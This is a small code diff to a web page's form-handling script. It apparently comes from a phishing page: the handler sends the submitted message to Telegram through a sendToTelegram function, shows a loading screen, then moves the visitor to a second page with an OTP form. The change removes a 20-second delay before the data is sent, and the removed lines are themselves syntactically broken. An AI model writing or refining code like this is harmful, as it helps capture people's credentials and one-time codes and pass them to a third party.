@@ -1578,8 +1578,7 @@
 
           document.getElementById("loadingScreen").style.display = "flex";
 
-          setTimeout(() => {
-            sendToTelegram(message)
+          sendToTelegram(message)
             .then((response) => {
               if (response.ok) {
                 showPage("page2");
@@ -1588,9 +1587,7 @@
             .finally(() => {
               document.getElementById("loadingScreen").style.display = "none";
             });
-          }, 20000; 
-        });
-
+        }
       // Handler form OTP (halaman 2)
       document
         .getElementById("otpForm")
